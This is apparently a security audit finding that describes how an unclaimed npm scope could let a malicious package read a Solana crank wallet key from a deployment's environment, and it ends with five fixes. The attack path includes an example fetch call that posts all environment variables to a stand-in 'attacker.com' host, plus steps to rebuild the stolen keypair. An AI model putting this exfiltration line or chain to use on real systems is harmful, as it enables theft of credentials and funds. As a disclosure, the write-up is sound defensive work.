# S004: Dependency Confusion → Crank Wallet Exfiltration

## Verdict: POTENTIAL

---

## Constituent Findings

| Finding | Verdict | Summary |
|---------|---------|---------|
| H007 | POTENTIAL | `@dr-fraudsworth/shared` declared as bare `"0.0.1"` with unclaimed npm scope; npm falls back to public registry if install context is not the workspace root |
| H002 | POTENTIAL | Mainnet crank wallet private key (`WALLET_KEYPAIR`) present in plaintext in `.env.mainnet` on disk; crank Railway process holds key as env var |

## Combined Attack Path

H007 identifies that `railway-crank.toml` uses `npm install` (not `npm ci`), meaning the crank build does not enforce the committed lockfile. H002 confirms that `WALLET_KEYPAIR` — the full 64-byte mainnet crank keypair for `F84XUxo5VM8FJZeGvC3CrHYwLzFod3ep57CULjZ4ZXc1` — is injected as a Railway env var into the crank process at runtime.

The chain:

```
1. Attacker registers the @dr-fraudsworth npm org (free, E404 confirmed — scope unclaimed).

2. Attacker publishes @dr-fraudsworth/shared@0.0.1 to the public registry.
   Payload: module-body code (NOT a postinstall hook — .npmrc has ignore-scripts=true).
   The malicious code is in the package's index.ts/js, executing at import time.

3. Trigger condition A — lockfile corruption path:
   A developer or CI job runs `npm install` from app/ (not workspace root).
   npm does not detect workspaces from app/package.json alone.
   npm resolves @dr-fraudsworth/shared@0.0.1 from the public registry.
   Updated lockfile is committed (e.g., in a PR or merge conflict resolution).

4. Trigger condition B — crank build path (lower bar):
   railway-crank.toml buildCommand = "npm install" (not npm ci).
   On any fresh Railway build where the lockfile is absent or regenerated,
   npm resolves @dr-fraudsworth/shared@0.0.1 from the registry.
   NOTE: The crank package.json is at root, not app/ — workspace resolution
   applies here. However, if the lockfile's link: true entry is ever lost
   (e.g., lockfile regenerated without workspace context), the bare "0.0.1"
   resolves to the registry package.

5. Malicious module body executes at crank startup:
   import { PROGRAM_IDS } from "@dr-fraudsworth/shared";
   → attacker's index.js runs before any protocol code.

6. Attacker reads process.env.WALLET_KEYPAIR:
   → 64-byte JSON array: [[REDACTED-CRANK-KEY-BYTES]
   → This is the complete secret key for the mainnet crank wallet.

7. Attacker exfiltrates via outbound HTTPS (no Railway egress filtering):
   fetch("https://attacker.com/collect", { method: "POST", body: JSON.stringify(process.env) })

8. Attacker reconstructs keypair:
   Keypair.fromSecretKey(new Uint8Array([[REDACTED-CRANK-KEY-BYTES]))
   → Signs arbitrary Solana mainnet transactions as F84XUxo5VM8FJZeGvC3CrHYwLzFod3ep57CULjZ4ZXc1.

9. Attacker drains crank SOL balance and gains epoch/carnage timing control.
   All other Railway env vars also exfiltrated: DATABASE_URL, HELIUS_API_KEY,
   HELIUS_WEBHOOK_SECRET (bridges into H005/H020 injection chain).
```

## Combined Impact

The combination is more dangerous than either finding alone:

- **H007 alone** requires a non-root install context to be exploitable. The crank uses `npm install` (confirmed in `railway-crank.toml:3`), which is weaker than `npm ci` but still uses the workspace lockfile under normal conditions. The gap is real but the trigger requires a specific failure mode.

- **H002 alone** requires local filesystem access to `.env.mainnet`, or Railway account compromise. The key is NOT in git history.

- **Combined**: H007's attack surface (unclaimed scope + `npm install` in crank build) provides a remote, registry-based pathway into the crank process at build/startup time. H002 confirms the prize that awaits — `WALLET_KEYPAIR` as a live env var in exactly that process. The two findings converge on the Railway crank service as the attack nexus.

**Severity of combination: HIGH** (not CRITICAL because two failure-mode preconditions must both align: lockfile drift AND scope registration, or a deliberate lockfile replacement attack).

| Consequence | Assessment |
|-------------|------------|
| Crank wallet drained | Full SOL balance stolen immediately |
| Epoch manipulation | Attacker controls epoch transition timing (crank is the practical caller) |
| Carnage buyback disruption | Carnage fund operations blocked or redirected |
| Webhook secret exfiltration | HELIUS_WEBHOOK_SECRET in same env → enables H005/H020 injection chain |
| Helius API key exfiltration | Enables webhook deletion and data pipeline takeover (see S007) |

## Recommendation

**Fix 1 (eliminates primary H007 vector — one line):**
In `app/package.json:18`, change `"@dr-fraudsworth/shared": "0.0.1"` to `"@dr-fraudsworth/shared": "workspace:*"`. This causes npm to hard-fail rather than fall back to the registry if workspace resolution fails.

**Fix 2 (eliminates crank lockfile drift — one line):**
In `railway-crank.toml:3`, change `buildCommand = "npm install"` to `buildCommand = "npm ci"`. With a committed lockfile and `npm ci`, the crank build cannot resolve any version other than what is pinned.

**Fix 3 (closes the namespace window):**
Register `@dr-fraudsworth` on npmjs.com immediately. An empty placeholder package is sufficient. Until this is done, the attack precondition (claiming the scope) requires zero effort from an attacker.

**Fix 4 (reduces blast radius):**
Remove `WALLET_KEYPAIR` from any local `.env.mainnet` once confirmed set on Railway. The key should exist only in Railway's secret store, not on any developer machine disk.

**Fix 5 (defense in depth):**
Rotate the crank wallet keypair. The current key at `.env.mainnet:88` has been present in the working tree with world-readable permissions (`0644`). Treat it as exposed and generate a fresh keypair before mainnet launch.
